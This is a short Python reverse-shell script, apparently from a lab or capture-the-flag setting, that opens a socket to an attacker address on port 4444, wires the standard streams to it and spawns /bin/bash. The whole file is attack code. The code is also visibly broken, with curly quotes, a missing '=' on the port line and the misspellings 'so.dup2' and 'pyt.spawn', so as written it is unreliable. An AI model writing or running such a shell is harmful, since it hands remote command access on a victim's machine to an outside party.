import socket
import os
import pty

def reverse_shell():
  attacker_ip = “tun0”
  attacker_port 4444
  s = socket.socket()
  s.connect ((attacker_ip, attacker_port))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  so.dup2(s.fileno(), 2) 
  pyt.spawn(”/bin/bash”)

reverse_shell()
